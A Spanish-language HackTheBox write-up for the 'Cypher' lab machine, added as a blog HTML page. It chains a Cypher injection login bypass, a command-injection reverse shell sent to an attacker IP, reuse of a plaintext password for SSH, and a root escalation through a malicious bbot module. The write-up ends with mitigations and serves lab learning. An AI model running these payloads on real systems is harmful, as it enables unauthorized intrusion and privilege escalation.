@@ -1,0 +1,302 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>HTB Cypher — Cypher Injection, RCE en extensión APOC y PrivEsc con bbot — Joaquin Silvagni</title>
+    <meta name="description" content="Write-up de HTB Cypher: inyección Cypher en Neo4j para saltar el login, RCE encadenando una extensión APOC vulnerable, reutilización de credenciales y escalada a root abusando de un CVE de bbot con sudo.">
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Sora:wght@600;700;800&family=Inter:wght@400;500;600;700&family=JetBrains+Mono:ital,wght@0,400;0,600;1,400&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="../css/style.css">
+</head>
+<body>
+    <nav id="nav" class="scrolled">
+        <a class="nav-logo" href="../index.html">Joaquin Silvagni</a>
+        <ul class="nav-links">
+            <li><a href="../index.html#destacados">Destacado</a></li>
+            <li><a href="../index.html#ejpt">Cert</a></li>
+            <li><a href="../index.html#blog">Write-ups</a></li>
+            <li><a href="../index.html#skills">Skills</a></li>
+            <li><a href="../index.html#contacto">Contacto</a></li>
+        </ul>
+    </nav>
+
+    <div class="post-page wu" style="display:block">
+        <a class="pb" href="../index.html#blog">&larr; Volver al blog</a>
+
+        <header class="wu-hero">
+            <div class="wu-hero-grid"></div>
+            <div class="wu-hero-inner">
+                <div class="wu-tag">✦ HackTheBox Writeup</div>
+                <h1 class="wu-title"><span class="nm">Cypher</span><br>HTB Machine</h1>
+                <p class="wu-sub">De un directory listing olvidado a shell de root: inyección Cypher contra Neo4j
+                    para saltar el login, una extensión APOC custom con command injection, y un CVE público de
+                    bbot para escalar privilegios.</p>
+                <div class="wu-stats">
+                    <div class="wu-stat"><span class="v">Medium</span><span class="l">Dificultad</span></div>
+                    <div class="wu-stat"><span class="v">Linux</span><span class="l">OS</span></div>
+                    <div class="wu-stat"><span class="v">650</span><span class="l">XP</span></div>
+                    <div class="wu-stat"><span class="v">#5563</span><span class="l">Machine Rank</span></div>
+                    <div class="wu-stat"><span class="v">02 Sep 2026</span><span class="l">Pwn Date</span></div>
+                </div>
+                <div class="wu-shot"><img src="../files/img/cypher-1.png" alt="You have solved Cypher!" onerror="this.closest('.wu-shot').style.display='none'"></div>
+            </div>
+        </header>
+
+        <section class="wu-chain">
+            <div class="lbl">// cadena de ataque</div>
+            <h2>Attack Chain Overview</h2>
+            <div class="chain">
+                <div class="chain-step"><div class="chain-num">1</div><div class="chain-content">
+                    <h3>Recon — nmap + feroxbuster</h3>
+                    <p>Un <code>/testing/</code> con <strong>directory listing</strong> filtra un <code>.jar</code> de build olvidado en producción.</p></div></div>
+                <div class="chain-step"><div class="chain-num">2</div><div class="chain-content">
+                    <h3>El JAR = extensión APOC vulnerable</h3>
+                    <p>Un procedimiento custom de Neo4j arma un comando de shell pegando texto → <strong>command injection</strong>.</p></div></div>
+                <div class="chain-step"><div class="chain-num">3</div><div class="chain-content">
+                    <h3>Cypher Injection en /api/auth</h3>
+                    <p>El login arma la query concatenando texto: un payload devuelve un hash conocido y otorga un <strong>JWT válido</strong> (auth bypass).</p></div></div>
+                <div class="chain-step"><div class="chain-num">4</div><div class="chain-content">
+                    <h3>Consola Cypher libre en /demo</h3>
+                    <p>Con la sesión, <code>/api/cypher</code> ejecuta cualquier query — un intérprete de base de datos a un click.</p></div></div>
+                <div class="chain-step"><div class="chain-num">5</div><div class="chain-content">
+                    <h3>RCE como neo4j</h3>
+                    <p>Se invoca el procedimiento vulnerable desde la consola → reverse shell como el usuario de la base.</p></div></div>
+                <div class="chain-step"><div class="chain-num">6</div><div class="chain-content">
+                    <h3>Cred reuse → SSH como graphasm</h3>
+                    <p>Un <code>bbot_preset.yml</code> guarda la contraseña de Neo4j en texto plano; sirve tal cual para SSH.</p></div></div>
+                <div class="chain-step"><div class="chain-num">7</div><div class="chain-content">
+                    <h3>PrivEsc a root — bbot <span class="cve">CVE · sudo NOPASSWD</span></h3>
+                    <p>bbot corre como root vía sudo y carga módulos Python propios: ejecución de código como root.</p></div></div>
+            </div>
+        </section>
+
+        <div class="pc2">
+            <div class="post-content">
+
+                <div class="callout"><span class="k">// LA IDEA EN UNA LÍNEA</span>Tres bugs independientes encadenados
+                    (listing + command injection + inyección en el login) llevan de "usuario anónimo" a shell, y un
+                    binario con sudo mal dado cierra la máquina en root. Si cualquiera de los tres estuviera bien
+                    resuelto, la cadena se corta.</div>
+
+                <div class="step-sec">
+                    <div class="step-head">
+                        <div class="step-num">01</div>
+                        <div class="t"><h2>Reconocimiento</h2>
+                            <p>nmap · feroxbuster · directory listing</p></div>
+                    </div>
+                    <p>Dos puertos abiertos y una web ("GRAPH ASM") que se presenta como una herramienta de Attack
+                        Surface Management basada en grafos.</p>
+                    <pre><code><span class="g">$</span> nmap -p22,80 -sCV -oN nmap 10.129.231.244
+
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu
+80/tcp open  http    nginx 1.24.0 (Ubuntu)</code></pre>
+                    <p>Fuzzeando con feroxbuster aparece un login, una API, y —clave para todo lo que sigue— un
+                        directorio con <strong>listing habilitado</strong>:</p>
+                    <pre><code><span class="g">$</span> feroxbuster -u http://cypher.htb/ -x js,css,png
+
+200  /login                                     → POST /api/auth
+307  /demo                                       → redirige a /login sin sesión
+<span class="o">301  /testing/                                   → directory listing expuesto</span>
+<span class="o">200  /testing/custom-apoc-extension-1.0-SNAPSHOT.jar</span>  ← build olvidado</code></pre>
+                    <div class="callout"><span class="k">// EN CRIOLLO — directory listing</span>Cuando un servidor web no
+                        tiene <code>index.html</code> en una carpeta y el listing está activado, muestra la lista de
+                        archivos como si fuera un explorador. Dejar eso en producción es regalar el mapa: acá expuso
+                        un <code>.jar</code> de compilación que nunca debería haber estado ahí.</div>
+                </div>
+
+                <div class="step-sec">
+                    <div class="step-head">
+                        <div class="step-num">02</div>
+                        <div class="t"><h2>El JAR filtrado</h2>
+                            <p>Extensión APOC custom · decompilación con CFR · command injection</p></div>
+                    </div>
+                    <div class="callout"><span class="k">// ¿QUÉ ES APOC?</span>Neo4j es una <strong>base de datos de
+                        grafos</strong> (guarda nodos y relaciones, no tablas). <strong>APOC</strong> es su librería
+                        de procedimientos extra. Acá alguien programó procedimientos <em>propios</em> y los empaquetó
+                        en ese <code>.jar</code> — el prefijo <code>custom.*</code> (en vez del oficial
+                        <code>apoc.*</code>) ya delata código no estándar, candidato a tener bugs.</div>
+                    <p>Se decompila el JAR a Java legible con CFR. Adentro hay un procedimiento
+                        <code>custom.getUrlStatusCode</code>: recibe una URL y devuelve el código HTTP que responde.
+                        El problema: en vez de usar una librería HTTP, arma un comando de terminal <strong>pegando
+                        texto</strong> y se lo pasa a la shell:</p>
+                    <pre><code><span class="g">$</span> java -jar cfr.jar custom-apoc-extension-1.0-SNAPSHOT.jar --outputdir cfr-out</code></pre>
+                    <pre><code>public Stream&lt;StringOutput&gt; getUrlStatusCode(String url) {
+    <span class="m">// sin sanitizar, sin escaping</span>
+    Object[] command = new String[]{"/bin/sh", "-c",
+        "curl -s -o /dev/null --connect-timeout 1 -w %{http_code} " + url};
+    Process process = Runtime.getRuntime().exec((String[]) command);</code></pre>
+                    <div class="callout"><span class="k">// POR QUÉ FALLA — command injection</span>Si en <code>url</code>
+                        mandás <code>google.com; whoami</code>, el comando final queda
+                        <code>curl ... google.com; whoami</code>. La shell ve el <code>;</code> como "terminó un
+                        comando, arrancá el siguiente" y ejecuta <code>whoami</code> aparte, con los permisos del
+                        proceso de Neo4j. Ese es el bug que más adelante da la shell.</div>
+                </div>
+
+                <div class="step-sec">
+                    <div class="step-head">
+                        <div class="step-num">03</div>
+                        <div class="t"><h2>Cypher Injection en /api/auth</h2>
+                            <p>Inyección en el login · oráculo de comilla · auth bypass</p></div>
+                    </div>
+                    <div class="callout"><span class="k">// EN CRIOLLO — inyección en una base de datos</span>Es el mismo
+                        bug que la clásica SQL injection, con otra gramática. Neo4j no habla SQL, habla <strong>Cypher</strong>
+                        (<code>MATCH</code>/<code>WHERE</code>/<code>RETURN</code> en vez de <code>SELECT</code>), pero el
+                        error es idéntico: si el backend arma la pregunta <em>pegando</em> tu texto
+                        (<code>"...WHERE u.name = '" + nombre + "'"</code>), una comilla tuya "cierra" el texto antes
+                        de tiempo y lo que sigue lo toma como código, no como dato.</p></div>
+                    <p>El primer test siempre es el más barato: una comilla suelta. Una sola comilla en el login
+                        rompe la query y —con debug mode activo— devuelve el <strong>traceback</strong> con la query
+                        real que arma por dentro:</p>
+                    <pre><code>neo4j.exceptions.CypherSyntaxError: Failed to parse string literal.
+"MATCH (u:USER)-[:SECRET]-&gt;(h:SHA1) WHERE u.name = '<span class="o">admin'</span>' RETURN h.value as hash"</code></pre>
+                    <p>La idea del bypass: forzar el <code>MATCH</code> a matchear cualquier usuario y pisar el
+                        <code>RETURN</code> para que devuelva un hash SHA1 <strong>conocido</strong> — el de la cadena
+                        vacía (<code>sha1("")</code>). Como password se manda <code>""</code>, que hashea a ese mismo
+                        valor:</p>
+                    <pre><code><span class="m"># payload.json</span>
+{"username": "x' OR 1=1 RETURN 'da39a3ee5e6b4b0d3255bfef95601890afd80709' as hash LIMIT 1 //", "password": ""}</code></pre>
+                    <pre><code><span class="g">$</span> curl -s -i -X POST http://cypher.htb/api/auth -H "Content-Type: application/json" -d @payload.json
+
+<span class="g">HTTP/1.1 200 OK
+set-cookie: access-token=eyJhbGciOiJIUzI1NiIs...</span></code></pre>
+                    <div class="callout"><span class="k">// RESULTADO</span>JWT válido. La app nunca valida que el usuario
+                        exista de verdad, solo que la query haya devuelto una fila. Nota: <code>sqlmap</code> no sirve
+                        acá — está hecho para dialectos SQL; en bases "raras" (grafos, NoSQL, LDAP) la explotación
+                        sigue siendo mayormente manual.</div>
+                </div>
+
+                <div class="step-sec">
+                    <div class="step-head">
+                        <div class="step-num">04</div>
+                        <div class="t"><h2>La consola de Cypher expuesta</h2>
+                            <p>/demo · /api/cypher · intérprete de queries sin filtro</p></div>
+                    </div>
+                    <p>Con la cookie, <code>/demo</code> ("Query Tool") deja de redirigir: es un editor de Cypher
+                        libre. Todo lo que se escribe se ejecuta contra la base tal cual, sin filtro:</p>
+                    <pre><code>searchNodes = function (searchTerm) {
+  $.ajax({ method: 'GET', url: `/api/cypher?query=${searchTerm}` });  <span class="m">// sin filtro</span>
+}</code></pre>
+                    <p>En la práctica es un <strong>intérprete de base de datos a un click</strong> — y como Neo4j
+                        tiene cargada la extensión APOC vulnerable del paso 02, se puede invocar
+                        <code>custom.getUrlStatusCode</code> directamente desde acá.</p>
+                </div>
+
+                <div class="step-sec">
+                    <div class="step-head">
+                        <div class="step-num">05</div>
+                        <div class="t"><h2>RCE: la cadena completa</h2>
+                            <p>Cypher injection + command injection + consola libre = ejecución remota</p></div>
+                    </div>
+                    <p>Se invoca el procedimiento vulnerable desde la consola con un payload que abre una reverse
+                        shell:</p>
+                    <pre><code><span class="g">CALL</span> custom.getUrlStatusCode('x.com; bash -c "bash -i &gt;&amp; /dev/tcp/10.10.15.4/4444 0&gt;&amp;1" #')
+<span class="g">YIELD</span> statusCode <span class="g">RETURN</span> statusCode</code></pre>
+                    <ol>
+                        <li><strong>Listener local:</strong> <code>nc -lnvp 4444</code>, esperando la conexión.</li>
+                        <li><strong>Request disparado:</strong> el <code>;</code> corta el <code>curl</code> original y
+                            arranca <code>bash -c "..."</code>; el <code>#</code> final comenta cualquier resto.</li>
+                        <li><strong>Shell recibida</strong> como <code>neo4j</code> — el propio proceso de la base,
+                            coherente con que el RCE corre dentro de un procedimiento APOC.</li>
+                    </ol>
+                    <pre><code><span class="g">neo4j@cypher:~$</span> id
+<span class="g">uid=110(neo4j) gid=113(neo4j) groups=113(neo4j)</span></code></pre>
+                </div>
+
+                <div class="step-sec">
+                    <div class="step-head">
+                        <div class="step-num">06</div>
+                        <div class="t"><h2>Post-explotación: reutilización de credenciales</h2>
+                            <p>bbot_preset.yml · password en texto plano · pivot a graphasm</p></div>
+                    </div>
+                    <p><code>user.txt</code> es de <code>graphasm</code> con permisos <code>640</code> — <code>neo4j</code>
+                        no puede leerlo. Hay que pivotar. En el home de graphasm aparece la config de bbot:</p>
+                    <pre><code><span class="g">neo4j@cypher:/home/graphasm$</span> cat bbot_preset.yml
+config:
+  modules:
+    neo4j:
+      username: neo4j
+      password: <span class="o">cU4btyib.20xtCMCXkBmerhK</span></code></pre>
+                    <div class="callout"><span class="k">// EN CRIOLLO — credential reuse</span>Un patrón clásico del mundo
+                        real: la misma contraseña se usa para varias cosas. Acá el YAML de <strong>bbot</strong> (la
+                        herramienta de recon que alimenta el grafo) guarda la password de Neo4j en texto plano — y esa
+                        misma sirve para el usuario del sistema por SSH.</div>
+                    <pre><code><span class="g">$</span> ssh graphasm@cypher.htb        <span class="m"># password: cU4btyib.20xtCMCXkBmerhK</span>
+<span class="g">graphasm@cypher:~$</span> cat user.txt
+<span class="g">[ USER FLAG ]</span></code></pre>
+                </div>
+
+                <div class="step-sec">
+                    <div class="step-head">
+                        <div class="step-num">07</div>
+                        <div class="t"><h2>Escalada de privilegios: bbot</h2>
+                            <p>sudo NOPASSWD · arbitrary file read · RCE vía módulo custom</p></div>
+                    </div>
+                    <pre><code><span class="g">graphasm@cypher:~$</span> sudo -l
+User graphasm may run the following commands on cypher:
+    (ALL) NOPASSWD: <span class="o">/usr/local/bin/bbot</span></code></pre>
+                    <p>La clave del combo: <code>graphasm</code> puede correr <code>bbot</code> como <strong>root, sin
+                        contraseña</strong>. Cualquier archivo que ese programa abra, lo abre como root. Hay un CVE
+                        público (<em>BBOT 2.1.0 — Local Privilege Escalation</em>) con dos formas de aprovecharlo.</p>
+                    <h3>Lectura arbitraria de archivos</h3>
+                    <p><code>-w</code>/<code>--whitelist</code> normalmente recibe dominios, pero también acepta la
+                        <strong>ruta a un archivo</strong>. En modo debug (<code>-d</code>), bbot construye un regex
+                        con su contenido y lo imprime — filtrando el archivo crudo aunque graphasm no pueda leerlo,
+                        porque quien lo abre es root:</p>
+                    <pre><code><span class="g">$</span> sudo /usr/local/bin/bbot -w /root/root.txt -d
+<span class="m">[DBUG] Generated Regex [(([a-z0-9-]+\.)+&lt;contenido real del archivo&gt;...</span></code></pre>
+                    <h3>Shell interactiva (RCE vía módulo custom)</h3>
+                    <div class="callout"><span class="k">// EN CRIOLLO — por qué importar un .py es peligroso</span>bbot
+                        permite cargar módulos Python propios con <code>module_dirs</code>. El bug: <strong>importa y
+                        ejecuta el archivo <code>.py</code> entero antes de validar</strong> que sea un módulo válido.
+                        En Python, "importar" un archivo ya corre cualquier código suelto que tenga arriba de todo —
+                        y como bbot corre como root, ese código corre como root.</div>
+                    <pre><code><span class="m"># /dev/shm/ExploitModule.py</span>
+import os
+os.system("bash")
+
+<span class="m"># /dev/shm/evil.yml</span>
+modules:
+  - ExploitModule
+module_dirs:
+  - /dev/shm/
+
+<span class="g">$</span> sudo /usr/local/bin/bbot -p /dev/shm/evil.yml
+<span class="m"># → bash interactiva, uid=0(root)</span></code></pre>
+                    <pre><code><span class="g">root@cypher:~#</span> id
+<span class="g">uid=0(root) gid=0(root) groups=0(root)</span>
+<span class="g">root@cypher:~#</span> cat /root/root.txt
+<span class="g">[ ROOT FLAG ]</span></code></pre>
+                </div>
+
+                <div class="step-sec">
+                    <div class="step-head">
+                        <div class="step-num"></div>
+                        <div class="t"><h2>Lecciones</h2>
+                            <p>Qué falló en cada eslabón y cómo se arregla</p></div>
+                    </div>
+                    <div style="overflow-x:auto">
+                    <table class="wu-table">
+                        <thead><tr><th>Hallazgo</th><th>Mitigación</th></tr></thead>
+                        <tbody>
+                            <tr><td class="v">Directory listing en /testing/</td><td>Deshabilitar listing; nunca dejar builds en producción</td></tr>
+                            <tr><td class="v">Command injection en el JAR</td><td>Usar una librería HTTP, nunca <code>exec</code> con concatenación de strings</td></tr>
+                            <tr><td class="v">Cypher injection en /api/auth</td><td>Queries parametrizadas: <code>session.run(query, username=username)</code></td></tr>
+                            <tr><td class="v">Traceback expuesto al cliente</td><td>Debug mode apagado en producción</td></tr>
+                            <tr><td class="v">/api/cypher sin restricciones</td><td>Nunca exponer un intérprete de query language al usuario final</td></tr>
+                            <tr><td class="v">Password en texto plano en YAML</td><td>Secrets manager / variables de entorno, no en archivos de config</td></tr>
+                            <tr><td class="v">bbot desactualizado con sudo NOPASSWD</td><td>Mantener versión al día; jamás sudo sin contraseña sobre herramientas que cargan código de terceros</td></tr>
+                        </tbody>
+                    </table>
+                    </div>
+                </div>
+
+            </div>
+        </div>
+    </div>
+
+    <footer><span>&copy; 2026 <span class="fa">Joaquin Silvagni</span></span><span>Offensive Security · Tooling</span></footer>
+</body>
+</html>
